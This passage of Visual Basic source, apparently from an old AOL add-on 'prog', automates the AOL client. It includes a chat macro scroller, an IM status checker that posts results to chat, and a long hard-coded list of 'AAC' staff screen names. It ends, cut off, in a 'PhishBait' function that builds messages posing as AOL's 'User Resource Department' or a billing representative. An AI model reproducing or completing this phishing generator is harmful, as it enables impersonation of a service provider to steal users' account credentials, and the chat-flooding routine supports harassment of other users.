    PC$ = PC$ & "<b><FONT COLOR=#FF0000>" & ab$ & "<FONT COLOR=#FFFF00>" & u$ & "<FONT COLOR=#002288>" & S$ & "<FONT COLOR=#00003377>" & T$ & "<FONT COLOR=#004466>" & Y$ & "<FONT COLOR=#00FF00>" & l$ & "<FONT COLOR=#006644>" & F$ & "<FONT COLOR=#007733>" & B$ & "<FONT COLOR=#008822>" & c$ & "<FONT COLOR=#009911>" & D$ & "<FONT COLOR=#008822>" & H$ & "<FONT COLOR=#007733>" & j$ & "<FONT COLOR=#006644>" & K$ & "<FONT COLOR=#005555>" & M$ & "<FONT COLOR=#004466>" & n$ & "<FONT COLOR=#003377>" & Q$ & "<FONT COLOR=#002288>" & V$ & "<FONT COLOR=#001199>" & z$
Next W
Call SendMail(Person$, txt, PC$)
End Sub







Function IsUserOnline()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = Findchildbytitle(MDI%, "Welcome,")
If welcome% <> 0 Then
   IsUserOnline = 1
Else:
   IsUserOnline = 0
End If
End Function



Function Juno_Activate()
X = GetCaption(JunoWindow)
AppActivate X
End Function

Function Juno_Tab()
JunoTab = FindChildByClass(JunoWindow, "#32770")
End Function

Function Juno_Window()
jun% = FindWindow("Afx:b:152e:6:386f", vbNullString)
JunoWindow = jun%
End Function

Sub KillDupes(Lst As ListBox)
For X = 0 To Lst.ListCount - 1
Current = Lst.List(X)
For i = 0 To Lst.ListCount - 1
Nower = Lst.List(i)
If i = X Then GoTo dontkill
If Nower = Current Then Lst.RemoveItem (i)
mmer.Label2.Caption = mmer.Label2.Caption - 1
dontkill:
Next i
Next X
End Sub




Private Sub MacroScroll(text As String)
'put your macro in a text box then
'Call MacroScroll
If Mid(text$, Len(text$), 1) <> Chr$(10) Then
    text$ = text$ + Chr$(13) + Chr$(10)
End If
Do While (InStr(text$, Chr$(13)) <> 0)
    Counter = Counter + 1
    SendChat Mid(text$, 1, InStr(text$, Chr(13)) - 1)
    If Counter = 4 Then
        TimeOut (2.9)
        Counter = 0
    End If
    text$ = Mid(text$, InStr(text$, Chr(13) + Chr(10)) + 2)
Loop
End Sub

Sub Menubystring(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)
For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)
For getstring = 0 To MenuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, getstring)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)
If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If
Next getstring
Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub

Sub OH_Names(List As ListBox)
List.AddItem "AAC2Teach"
List.AddItem "AAC2tor4u"
List.AddItem "AACAcctLiz"
List.AddItem "AACAdJohn"
List.AddItem "AACAlgebra"
List.AddItem "AACAnimTch"
List.AddItem "AACAPTch"
List.AddItem "AACArchTek"
List.AddItem "AACArtArt"
List.AddItem "AACAskBio"
List.AddItem "AACBackDoc"
List.AddItem "AACBikeRPh"
List.AddItem "AACBioAgnt"
List.AddItem "AACBioBug"
List.AddItem "AACBioGS3"
List.AddItem "AACBioHous"
List.AddItem "AACBioHut"
List.AddItem "AACBioKen"
List.AddItem "AACBioLyn"
List.AddItem "AACBioMo"
List.AddItem "AACBioSci"
List.AddItem "AACBioSign"
List.AddItem "AACBioTch"
List.AddItem "AACBioTch1"
List.AddItem "AACBioTM"
List.AddItem "AACBioTutr"
List.AddItem "AACBioWhiz"
List.AddItem "AACBizSam"
List.AddItem "AACBusEd"
List.AddItem "AACCharis"
List.AddItem "AACChemAu"
List.AddItem "AACChemCE"
List.AddItem "AACChemDAS"
List.AddItem "AACChemDr"
List.AddItem "AACChemMan"
List.AddItem "AACChemPhy"
List.AddItem "AACChmA1A"
List.AddItem "AACChmAmi"
List.AddItem "AACChmDrT"
List.AddItem "AACChmH2O"
List.AddItem "AACChmHLM"
List.AddItem "AACChmInst"
List.AddItem "AACChmProf"
List.AddItem "AACChmSci"
List.AddItem "AACChmTigr"
List.AddItem "AACChmTony"
List.AddItem "AACLDTeac"
List.AddItem "AACmsAlina"
List.AddItem "AACCoachB"
List.AddItem "AACCoachK"
List.AddItem "AACCoachPK"
List.AddItem "AACCoachT"
List.AddItem "AACCompute"
List.AddItem "AACCplTim"
List.AddItem "AACCrimLaw"
List.AddItem "AACDaveTch"
List.AddItem "AACDocChem"
List.AddItem "AACDocHist"
List.AddItem "AACDocRob"
List.AddItem "AACDr1abd"
List.AddItem "AACDr57M"
List.AddItem "AACDr7Fe"
List.AddItem "AACDrAce"
List.AddItem "AACDrAlchm"
List.AddItem "AACDrAnP"
List.AddItem "AACDrAsh"
List.AddItem "AACDrAsha1"
List.AddItem "AACDrAVIMA"
List.AddItem "AACDrAVL"
List.AddItem "AACDrAvo"
List.AddItem "AACDrBach"
List.AddItem "AACDrBart"
List.AddItem "AACDrBert"
List.AddItem "AACDrBeth"
List.AddItem "AACDrBob"
List.AddItem "AACDrBones"
List.AddItem "AACDrBwulf"
List.AddItem "AACDrChris"
List.AddItem "AACDrCnnea"
List.AddItem "AACDrDan"
List.AddItem "AACDrDar"
List.AddItem "AACDrDave"
List.AddItem "AACDrDavid"
List.AddItem "AACDrDay"
List.AddItem "AACDrDC"
List.AddItem "AACDrDenis"
List.AddItem "AACDrDJ"
List.AddItem "AACDrDLC"
List.AddItem "AACDrDlfin"
List.AddItem "AACDrDoe"
List.AddItem "AACDrdoole"
List.AddItem "AACDrDunm"
List.AddItem "AACDrE"
List.AddItem "AACDrEl"
List.AddItem "AACDrFizik"
List.AddItem "AACDrFloc"
List.AddItem "AACDrFrank"
List.AddItem "AACDrGee"
List.AddItem "AACDrGenet"
List.AddItem "AACDrGramr"
List.AddItem "AACDrGriff"
List.AddItem "AACDrGV"
List.AddItem "AACDrHuman"
List.AddItem "AACDrIG"
List.AddItem "AACDrIon"
List.AddItem "AACDrJefef"
List.AddItem "AACDrJLH"
List.AddItem "AACDrJoe"
List.AddItem "AACDrJohn"
List.AddItem "AACDrJosh"
List.AddItem "AACDrJWM"
List.AddItem "AACDrKaye"
List.AddItem "AACDrKenn"
List.AddItem "AACDrKstrl"
List.AddItem "AACDrLatin"
List.AddItem "AACDrLgl"
List.AddItem "AACDrLee"
List.AddItem "AACDrLew"
List.AddItem "AACDrLit"
List.AddItem "AACDrLit56"
List.AddItem "AACDrLucie"
List.AddItem "AACDrLynne"
List.AddItem "AACDrMac"
List.AddItem "AACDrMark"
List.AddItem "AACDrMath"
List.AddItem "AACDrMills"
List.AddItem "AACDrMoon"
List.AddItem "AACDrMrsC"
List.AddItem "AACDrNeale"
List.AddItem "AACDrOBGYN"
List.AddItem "AACDrOtter"
List.AddItem "AACDrPaul"
List.AddItem "AACDrPDK"
List.AddItem "AACDrPDLaw"
List.AddItem "AACDrPepr"
List.AddItem "AACDrPel"
List.AddItem "AACDrPG"
List.AddItem "AACDrPhil"
List.AddItem "AACDrPhrog"
List.AddItem "AACDrphysk"
List.AddItem "AACDrPsych"
List.AddItem "AACDrRam"
List.AddItem "AACDrRaven"
List.AddItem "AACDrRealE"
List.AddItem "AACDrRedox"
List.AddItem "AACDrReid"
List.AddItem "AACDrRGBiv"
List.AddItem "AACDrRR"
List.AddItem "AACDrRxn"
List.AddItem "AACDrSailr"
List.AddItem "AACDrShel"
List.AddItem "AACDrShrmp"
List.AddItem "AACDrSid"
List.AddItem "AACDrSmall"
List.AddItem "AACDrSpine"
List.AddItem "AACDrSport"
List.AddItem "AACDrSSH"
List.AddItem "AACDrStars"
List.AddItem "AACDrSteph"
List.AddItem "AACDrTerry"
List.AddItem "AACDrTime"
List.AddItem "AACDrToad"
List.AddItem "AACDrTodd"
List.AddItem "AACDrTomm"
List.AddItem "AACDrTomDC"
List.AddItem "AACDrTrig"
List.AddItem "AACDrVadya"
List.AddItem "AACDrWade"
List.AddItem "AACDrWilb"
List.AddItem "AACDrWS"
List.AddItem "AACEdadmin"
List.AddItem "AACEdGrace"
List.AddItem "AACEduABC2"
List.AddItem "AACEduBibl"
List.AddItem "AACEduCLS"
List.AddItem "AACEducjed"
List.AddItem "AACEduGA"
List.AddItem "AACEduHaj"
List.AddItem "AACEduJim"
List.AddItem "AACEduJo"
List.AddItem "AACEduKtor"
List.AddItem "AACEduLaur"
List.AddItem "AACEdulin"
List.AddItem "AACEduMsB"
List.AddItem "AACEduRob"
List.AddItem "AACEduRRL"
List.AddItem "AACEduSoar"
List.AddItem "AACEduSuzy"
List.AddItem "AACEduWolf"
List.AddItem "AACEERJV"
List.AddItem "AACEgrDave"
List.AddItem "AACEng1"
List.AddItem "AACEngAppl"
List.AddItem "AACEngBarr"
List.AddItem "AACEngBoni"
List.AddItem "AACEngBry"
List.AddItem "AACEngBus"
List.AddItem "AACEngckk"
List.AddItem "AACEngDjm"
List.AddItem "AACEngFun"
List.AddItem "AACEngElf"
List.AddItem "AACEngGuru"
List.AddItem "AACEngJch"
List.AddItem "AACEngJrnT"
List.AddItem "AACEngKat"
List.AddItem "AACEnglcom"
List.AddItem "AACEngLit"
List.AddItem "AACEngNuke"
List.AddItem "AACEngPat"
List.AddItem "AACEngPen"
List.AddItem "AACEngPSD"
List.AddItem "AACEngSoni"
List.AddItem "AACEngStar"
List.AddItem "AACEngTchr"
List.AddItem "AACEngThom"
List.AddItem "AACEngTutr"
List.AddItem "AACEngZuZu"
List.AddItem "AACeyedoc"
List.AddItem "AACFamDoc"
List.AddItem "AACFrchSpa"
List.AddItem "AACFrenchT"
List.AddItem "AACFrHisto"
List.AddItem "AACFrnEng"
List.AddItem "AACFrogTch"
List.AddItem "AACGailRN"
List.AddItem "AACGaSciGy"
List.AddItem "AACGasLaw"
List.AddItem "AACGerEng"
List.AddItem "AACHal"
List.AddItem "AACHistARB"
List.AddItem "AACHistBrM"
List.AddItem "AACHistGuy"
List.AddItem "AACHistIra"
List.AddItem "AACHistJen"
List.AddItem "AACHistLa"
List.AddItem "AACHistMed"
List.AddItem "AACHistMrM"
List.AddItem "AACHstMOPA"
List.AddItem "AACHistNat"
List.AddItem "AACHistNY"
List.AddItem "AACHistTch"
List.AddItem "AACHistTes"
List.AddItem "AACHlthPE"
List.AddItem "AACHostKNG"
List.AddItem "AACHstRoss"
List.AddItem "AACiainPhD"
List.AddItem "AACInstCat"
List.AddItem "AACInstCSA"
List.AddItem "AACInstDan"
List.AddItem "AACInstGrn"
List.AddItem "AACInstKim"
List.AddItem "AACInstrJo"
List.AddItem "AACInstRCR"
List.AddItem "AACInstrJC"
List.AddItem "AACInstrKR"
List.AddItem "AACInstrRN"
List.AddItem "AACITEach"
List.AddItem "AACJan"
List.AddItem "AACJonTch"
List.AddItem "AACJournJm"
List.AddItem "AACJrnProf"
List.AddItem "AACjtTeach"
List.AddItem "AACJudeTch"
List.AddItem "AACKKEduc"
List.AddItem "AACLangDoc"
List.AddItem "AACLATchr"
List.AddItem "AACLawHist"
List.AddItem "AACLawLiz"
List.AddItem "AACLawTech"
List.AddItem "AACLitDoc"
List.AddItem "AACLitDot"
List.AddItem "AACLitLady"
List.AddItem "AACLitTc"
List.AddItem "AACLPNLisa"
List.AddItem "AACLv2Tch"
List.AddItem "AACMacTchr"
List.AddItem "AACMatDust"
List.AddItem "AACMath121"
List.AddItem "AACMath135"
List.AddItem "AACMath314"
List.AddItem "AACMath952"
List.AddItem "AACMathAL"
List.AddItem "AACMathALH"
List.AddItem "AACMathAmy"
List.AddItem "AACMathBLS"
List.AddItem "AACMathCal"
List.AddItem "AACMathCM"
List.AddItem "AACMathCor"
List.AddItem "AACMathCpt"
List.AddItem "AACMathCTW"
List.AddItem "AACMathFrn"
List.AddItem "AACMathJaZ"
List.AddItem "AACMathJC"
List.AddItem "AACMathJEL"
List.AddItem "AACMathJer"
List.AddItem "AACMathJF"
List.AddItem "AACMathJJ"
List.AddItem "AACMathJoe"
List.AddItem "AACMathJR"
List.AddItem "AACMathKar"
List.AddItem "AACMathLDW"
List.AddItem "AACMathLrn"
List.AddItem "AACMathMan"
List.AddItem "AACMathMat"
List.AddItem "AACMathMax"
List.AddItem "AACMathMD7"
List.AddItem "AACMathme"
List.AddItem "AACMathMJ"
List.AddItem "AACMathMJF"
List.AddItem "AACMathMO"
List.AddItem "AACMathMom"
List.AddItem "AACMathMoo"
List.AddItem "AACMathMRS"
List.AddItem "AACMathPKA"
List.AddItem "AACMathRbk"
List.AddItem "AACMathRon"
List.AddItem "AACMathRox"
List.AddItem "AACMathSal"
List.AddItem "AACMathSAW"
List.AddItem "AACMathSCM"
List.AddItem "AACMathSeb"
List.AddItem "AACMathSHS"
List.AddItem "AACMathSte"
List.AddItem "AACMathStu"
List.AddItem "AACMathSue"
List.AddItem "AACMathSV"
List.AddItem "AACMathTam"
List.AddItem "AACMathTch"
List.AddItem "AACMathTF4"
List.AddItem "AACMathTom"
List.AddItem "AACMathVan"
List.AddItem "AACMathVIR"
List.AddItem "AACMathWhz"
List.AddItem "AACMathWiz"
List.AddItem "AACMathWWM"
List.AddItem "AACMaxx"
List.AddItem "AACMBPeach"
List.AddItem "AACmecheng"
List.AddItem "AACMedCCRN"
List.AddItem "AACMedEmer"
List.AddItem "AACMedicPS"
List.AddItem "AACMedSci"
List.AddItem "AACMissA"
List.AddItem "AACMissAng"
List.AddItem "AACMissAmy"
List.AddItem "AACMissB"
List.AddItem "AACMissCyn"
List.AddItem "AACMissDy"
List.AddItem "AACMissH"
List.AddItem "AACMissKMB"
List.AddItem "AACMissLiz"
List.AddItem "AACMissP"
List.AddItem "AACMissT"
List.AddItem "AACMizMath"
List.AddItem "AACMR"
List.AddItem "AACMr1234"
List.AddItem "AACMrABC"
List.AddItem "AACMrAcct"
List.AddItem "AACMrAid"
List.AddItem "AACMrAIKO"
List.AddItem "AACMrAJPC"
List.AddItem "AACMrAlan"
List.AddItem "AACMrAlgem"
List.AddItem "AACMrAllen"
List.AddItem "AACMrAuto"
List.AddItem "AACMrAvion"
List.AddItem "AACMrB"
List.AddItem "AACMrBill"
List.AddItem "AACMrBill2"
List.AddItem "AACMrBrdge"
List.AddItem "AACMrC"
List.AddItem "AACMrCarey"
List.AddItem "AACMrCEng"
List.AddItem "AACMrCFB"
List.AddItem "AACMrChE"
List.AddItem "AACMrChris"
List.AddItem "AACMrCoach"
List.AddItem "AACMrCoop"
List.AddItem "AACMrCPA"
List.AddItem "AACMrCring"
List.AddItem "AACMrDavis"
List.AddItem "AACMrDrama"
List.AddItem "AACMrDW"
List.AddItem "AACMrE2Me"
List.AddItem "AACMrEarth"
List.AddItem "AACMrEMTP"
List.AddItem "AACMrFable"
List.AddItem "AACMrFlopy"
List.AddItem "AACMrFlwrs"
List.AddItem "AACMrFourB"
List.AddItem "AACMrGon"
List.AddItem "AACMrGov"
List.AddItem "AACMrGreg"
List.AddItem "AACMrGrow"
List.AddItem "AACMrH"
List.AddItem "AACMrHargi"
List.AddItem "AACMrHavoc"
List.AddItem "AACMrHeath"
List.AddItem "AACMrHNTR"
List.AddItem "AACMrHnttn"
List.AddItem "AACMrHunt"
List.AddItem "AACMrHyde"
List.AddItem "AACMrJames"
List.AddItem "AACMrJchem"
List.AddItem "AACMrJeff"
List.AddItem "AACMrJimbo"
List.AddItem "AACMrJNW"
List.AddItem "AACMrJohn"
List.AddItem "AACMrJtx"
List.AddItem "AACMrKCB"
List.AddItem "AACMrKD"
List.AddItem "AACMrKitt"
List.AddItem "AACMrKEW"
List.AddItem "AACMrKPD"
List.AddItem "AACMrL"
List.AddItem "AACMrLewis"
List.AddItem "AACMrLwPrf"
List.AddItem "AACMrM"
List.AddItem "AACMrMac"
List.AddItem "AACMrMagic"
List.AddItem "AACMrMarco"
List.AddItem "AACMrMath3"
List.AddItem "AACMrMathX"
List.AddItem "AACMrMathZ"
List.AddItem "AACMrMaze"
List.AddItem "AACMrMike"
List.AddItem "AACMrNozit"
List.AddItem "AACMrPhiby"
List.AddItem "AACMrPhrm"
List.AddItem "AACMrRay"
List.AddItem "AACMrRibs"
List.AddItem "AACMrRog"
List.AddItem "AACMrSal"
List.AddItem "AACMrScott"
List.AddItem "AACMrShaun"
List.AddItem "AACMrSirC"
List.AddItem "AACMrSky10"
List.AddItem "AACMrSpark"
List.AddItem "AACMrSpear"
List.AddItem "AACMrSteve"
List.AddItem "AACMrTBear"
List.AddItem "AACMrTeach"
List.AddItem "AACMrTiff"
List.AddItem "AACMrTJ"
List.AddItem "AACMrTony"
List.AddItem "AACMrUne"
List.AddItem "AACMrUno"
List.AddItem "AACMrV"
List.AddItem "AACMrVideo"
List.AddItem "AACMrXpert"
List.AddItem "AACMrZee"
List.AddItem "AACMrsA"
List.AddItem "AACMrsAlg"
List.AddItem "AACMrsAsk"
List.AddItem "AACMrsAtom"
List.AddItem "AACMrsBell"
List.AddItem "AACMrsBP"
List.AddItem "AACMrsD"
List.AddItem "AACMrsDee"
List.AddItem "AACMrsF"
List.AddItem "AACMrsH"
List.AddItem "AACMrsHart"
List.AddItem "AACMrsK"
List.AddItem "AACMrsLC"
List.AddItem "AACMrsM"
List.AddItem "AACMrsMac"
List.AddItem "AACMrsMath"
List.AddItem "AACMrsMJB"
List.AddItem "AACMrsN"
List.AddItem "AACMrsO"
List.AddItem "AACMrsP"
List.AddItem "AACMrsSal"
List.AddItem "AACMrsSul"
List.AddItem "AACMrsWolf"
List.AddItem "AACMsAct"
List.AddItem "AACMsAllen"
List.AddItem "AACMsAly"
List.AddItem "AACMsAnn"
List.AddItem "AACMsAnnie"
List.AddItem "AACMsanser"
List.AddItem "AACMsApple"
List.AddItem "AACMsAriel"
List.AddItem "AACMsBama"
List.AddItem "AACMsBasic"
List.AddItem "AACMsBean"
List.AddItem "AACMsBeata"
List.AddItem "AACMsBelle"
List.AddItem "AACMsBEngl"
List.AddItem "AACMsBook"
List.AddItem "AACMsBrava"
List.AddItem "AACMsBryte"
List.AddItem "AACMsCaEng"
List.AddItem "AACMsChief"
List.AddItem "AACMsCMF"
List.AddItem "AACMsCoop"
List.AddItem "AACMsCount"
List.AddItem "AACMsDarci"
List.AddItem "AACMsDawn"
List.AddItem "AACMsDebi"
List.AddItem "AACMsDee"
List.AddItem "AACMsdenis"
List.AddItem "AACMsDiana"
List.AddItem "AACMsDonna"
List.AddItem "AACMsDraya"
List.AddItem "AACMsEdFun"
List.AddItem "AACMsElisa"
List.AddItem "AACMsErase"
List.AddItem "AACMsEsq"
List.AddItem "AACMsEssie"
List.AddItem "AACMsFink"
List.AddItem "AACMsGEng"
List.AddItem "AACMsGlobe"
List.AddItem "AACMsGlyph"
List.AddItem "AACMsGramr"
List.AddItem "AACMsGreen"
List.AddItem "AACMsHist"
List.AddItem "AACMsHMW"
List.AddItem "AACMsHolly"
List.AddItem "AACMsHstry"
List.AddItem "AACMsInfo"
List.AddItem "AACMsJacki"
List.AddItem "AACMsJaime"
List.AddItem "AACMsJapan"
List.AddItem "AACMsJayne"
List.AddItem "AACMsJeane"
List.AddItem "AACMsJenny"
List.AddItem "AACMsJill"
List.AddItem "AACMsJoJo"
List.AddItem "AACMsJulia"
List.AddItem "AACMsKaren"
List.AddItem "AACMsKat"
List.AddItem "AACMsKathy"
List.AddItem "AACMsKell"
List.AddItem "AACMsKiddy"
List.AddItem "AACMsKris"
List.AddItem "AACMsL"
List.AddItem "AACMsLaLib"
List.AddItem "AACMsLeigh"
List.AddItem "AACMsLinda"
List.AddItem "AACMsLinde"
List.AddItem "AACMsLogic"
List.AddItem "AACMsLuAnn"
List.AddItem "AACMsLyann"
List.AddItem "AACMsMac"
List.AddItem "AACMsMagik"
List.AddItem "AACMsMAK"
List.AddItem "AACMsMarci"
List.AddItem "AACMsMath"
List.AddItem "AACMsMentr"
List.AddItem "AACMsMex"
List.AddItem "AACMsMolly"
List.AddItem "AACMsNavy"
List.AddItem "AACMsNibbs"
List.AddItem "AACMsNoun"
List.AddItem "AACMsNRSJD"
List.AddItem "AACMsOD"
List.AddItem "AACMsPatti"
List.AddItem "AACMsPeggy"
List.AddItem "AACMsPiano"
List.AddItem "AACMsPrue"
List.AddItem "AACMsQnA"
List.AddItem "AACMsQuilt"
List.AddItem "AACMsR"
List.AddItem "AACMsRach"
List.AddItem "AACMsRenel"
List.AddItem "AACMsRes"
List.AddItem "AACMsRiza"
List.AddItem "AACMsRobin"
List.AddItem "AACMsRobyn"
List.AddItem "AACMsRomy"
List.AddItem "AACMsRusso"
List.AddItem "AACMsSatyr"
List.AddItem "AACMsShan"
List.AddItem "AACMsShawn"
List.AddItem "AACMsShock"
List.AddItem "AACMsStar"
List.AddItem "AACMsSteff"
List.AddItem "AACMsSudie"
List.AddItem "AACMsSue"
List.AddItem "AACMsSusie"
List.AddItem "AACMsTake"
List.AddItem "AACMsTalia"
List.AddItem "AACMsTaran"
List.AddItem "AACMsTB"
List.AddItem "AACMsTch4"
List.AddItem "AACMsTeri"
List.AddItem "AACMsTexas"
List.AddItem "AACMsTutor"
List.AddItem "AACMsTwnkl"
List.AddItem "AACMsTyler"
List.AddItem "AACMsVBMth"
List.AddItem "AACMsVern"
List.AddItem "AACMsVicki"
List.AddItem "AACMsVin"
List.AddItem "AACMsViv"
List.AddItem "AACMsW"
List.AddItem "AACMsWendy"
List.AddItem "AACMsZBear"
List.AddItem "AACMthFire"
List.AddItem "AACMthGeni"
List.AddItem "AACMthNmbr"
List.AddItem "AACMthNorm"
List.AddItem "AACMthSci"
List.AddItem "AACMthStew"
List.AddItem "AACMthTchr"
List.AddItem "AACMthwiz"
List.AddItem "AACMusTch"
List.AddItem "AACMxCrsty"
List.AddItem "AACMythTch"
List.AddItem "AACMzArts"
List.AddItem "AACMzBiz"
List.AddItem "AACMzBusyB"
List.AddItem "AACMzCS"
List.AddItem "AACMzDark"
List.AddItem "AACMzDonna"
List.AddItem "AACMzEng"
List.AddItem "AACMzFriz"
List.AddItem "AACMzGayle"
List.AddItem "AACMzKitty"
List.AddItem "AACMzKori"
List.AddItem "AACMzLacy"
List.AddItem "AACMzLinda"
List.AddItem "AACMzLynda"
List.AddItem "AACMzMacak"
List.AddItem "AACMzMandy"
List.AddItem "AACMzMarcy"
List.AddItem "AACMzMaxRN"
List.AddItem "AACMzOracl"
List.AddItem "AACMzPeggy"
List.AddItem "AACMzShell"
List.AddItem "AACMzShirl"
List.AddItem "AACMzSook"
List.AddItem "AACMzTique"
List.AddItem "AACmzWords"
List.AddItem "AACMzZelda"
List.AddItem "AACNo1Tchr"
List.AddItem "AACnursED"
List.AddItem "AACPACJer"
List.AddItem "AACPat"
List.AddItem "AACPDnvp"
List.AddItem "AACPEJan"
List.AddItem "AACPfKiron"
List.AddItem "AACPfrMich"
List.AddItem "AACPfSpeare"
List.AddItem "AACPgrJoan"
List.AddItem "AACPhyBohr"
List.AddItem "AACPhyDan"
List.AddItem "AACPhyMri"
List.AddItem "AACPhysics"
List.AddItem "AACPhyTch"
List.AddItem "AACPolska"
List.AddItem "AACPolTchr"
List.AddItem "AACPrf1Bob"
List.AddItem "AACPrf2U"
List.AddItem "AACPrf4Man"
List.AddItem "AACPrfAbby"
List.AddItem "AACPrfAlg"
List.AddItem "AACPrfArch"
List.AddItem "AACPrfARed"
List.AddItem "AACPrfASK"
List.AddItem "AACPrfB"
List.AddItem "AACPrfBank"
List.AddItem "AACPrfBear"
List.AddItem "AACPrfBeth"
List.AddItem "AACPrfBib"
List.AddItem "AACPrfBJ"
List.AddItem "AACPrfBma"
List.AddItem "AACPrfBob"
List.AddItem "AACPrfBTur"
List.AddItem "AACPrfCarl"
List.AddItem "AACPrfCase"
List.AddItem "AACPrfCBB"
List.AddItem "AACPrfComp"
List.AddItem "AACPrfCris"
List.AddItem "AACPrfCrow"
List.AddItem "AACPrfDave"
List.AddItem "AACPrfDick"
List.AddItem "AACPrfDooz"
List.AddItem "AACPrfDoug"
List.AddItem "AACPrfDune"
List.AddItem "AACPrfDyn"
List.AddItem "AACPrfEVal"
List.AddItem "AACPrfFair"
List.AddItem "AACPrfFin"
List.AddItem "AACPrfFrch"
List.AddItem "AACPrfFrog"
List.AddItem "AACPrfGdss"
List.AddItem "AACPrfGene"
List.AddItem "AACPrfGeo"
List.AddItem "AACPrfGkni"
List.AddItem "AACPrfHola"
List.AddItem "AACPrfIsis"
List.AddItem "AACPrfJake"
List.AddItem "AACPrfJEI"
List.AddItem "AACPrfJohn"
List.AddItem "AACPrfJoni"
List.AddItem "AACPrfKate"
List.AddItem "AACPrfKath"
List.AddItem "AACPrfKirk"
List.AddItem "AACPrfknow"
List.AddItem "AACPrfLang"
List.AddItem "AACPrfLudw"
List.AddItem "AACPrfM"
List.AddItem "AACPrfMack"
List.AddItem "AACPrfMark"
List.AddItem "AACPrfMath"
List.AddItem "AACPrfMatt"
List.AddItem "AACPrfMdv"
List.AddItem "AACPrfMead"
List.AddItem "AACPrfMel"
List.AddItem "AACPrfMess"
List.AddItem "AACPrfMich"
List.AddItem "AACPrfMike"
List.AddItem "AACPrfMomm"
List.AddItem "AACPrfMore"
List.AddItem "AACPrfMyst"
List.AddItem "AACPrfNeil"
List.AddItem "AACPrfPH"
List.AddItem "AACPrfPhil"
List.AddItem "AACPrfPlus"
List.AddItem "AACPrfPolo"
List.AddItem "AACPrfprps"
List.AddItem "AACPrfRagu"
List.AddItem "AACPrfRain"
List.AddItem "AACPrfSpan"
End Sub
Function Onlinecheck(Person As String)
Dim intmessageresult As Integer
Dim blnisdirty As String
blnisdirty = True
Person$ = UCase(Person)
AOL% = FindWindow("AOL Frame25", "America  Online")
Call AOLRunMenuByString("Send an Instant Message")

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin = Findchildbytitle(MDI%, "Send Instant Message")
aoledit% = FindChildByClass(IMWin, "_AOL_Edit")
aolrich% = FindChildByClass(IMWin, "RICHCNTL")
IMsend2% = FindChildByClass(IMWin, "_AOL_Icon")
msg% = FindWindow("#32770", "America Online")

If aoledit% <> 0 And aolrich% <> 0 And IMsend2% <> 0 Then Exit Do
Loop

Call AOLSetText(aoledit%, Person)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
IMsend2% = GetWindow(IMsend2%, 2)
clik:
AOLIcon (IMsend2%)
msg% = FindWindow("#32770", "America Online")
If msg% = 0 Then GoTo clik:
stc = FindChildByClass(msg%, "_AOL_Static")
X = GetText(msg%)
If InStr(1, X, "currently") Then z = Person & " is not available" 'put what to say here if they are offline
If InStr(1, X, "able") Then z = Person & " has IM's on"    'Put what to say in here for IMs on
If InStr(1, X, "cannot") Then z = Person & " has IM's off" 'Put what to say here for IMs off
Onlinecheck = z
If z = Person & " is not available" Then
Pause (1)
WaitForOk
WaitForOk
intmessageresult = MsgBox(LCase$(Person) & " is not signed on or ghostin." & vbCrLf & "Do You Want to Send this to Chat?", vbYesNo + vbQuestion, "Lethal IM Checker")
If intmessageresult = vbYes Then
AOLChatsend "•·.• " & LCase$(Person) & " • is not signed on or ghostin •"
End If
Else
End If
If z = Person & " has IM's off" Then
Pause (1)
WaitForOk
WaitForOk
intmessageresult = MsgBox(LCase$(Person) & " has their IMz off." & vbCrLf & "Do You Want to Send this to Chat?", vbYesNo + vbQuestion, "Lethal IM Checker")
If intmessageresult = vbYes Then
AOLChatsend "•·.• " & LCase$(Person) & " • has their IMz off •"
End If
Else
End If
If z = Person & " has IM's on" Then
Pause (1)
WaitForOk
WaitForOk
intmessageresult = MsgBox(LCase$(Person) & " has their IMz on." & vbCrLf & "Do You Want to Send this to Chat?", vbYesNo + vbQuestion, "Lethal IM Checker")
If intmessageresult = vbYes Then
AOLChatsend "•·.• " & LCase$(Person) & " • has their IMz on •"
End If
Else
End If
S = SendMessageByNum(msg%, WM_CLOSE, 0, 0)
S = SendMessageByNum(msg%, WM_CLOSE, 0, 0)
S = SendMessageByNum(msg%, WM_CLOSE, 0, 0)
S = SendMessageByNum(IMWin, WM_CLOSE, 0, 0)
End Function

Sub AOLSetText(win, txt)
TheText% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub

Sub password(txt As TextBox, werd)
'Heres a Password checker for all those Secret Areas
'In your Proggs To change the Password just change
'Where it says Bob to whatever your Password is
'Make sure u keep it in quotes
PW = werd
If Not txt = PW Then
MsgBox "Invalid Password try again", vbOK, "Imagine98"
End If
If txt = PW Then
MsgBox "Right Password"

End If
End Sub

Sub Pause(interval)

Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Sub

Function PhishBait()
Dim dsa$
Dim das$
dsa$ = ""
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then dsa$ = "Hi, "
If asd = 2 Then dsa$ = "Hello, "
If asd = 3 Then dsa$ = "Good Day, "
If asd = 4 Then dsa$ = "Good Afternoon, "
If asd = 5 Then dsa$ = "Good Evening, "
If asd = 6 Then dsa$ = "Good Morning, "
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = dsa$ & "I am with the America Online User Resource Department.  "
If asd = 2 Then das$ = dsa$ & "I am Bill Smith, a billing representative for America Online.  "
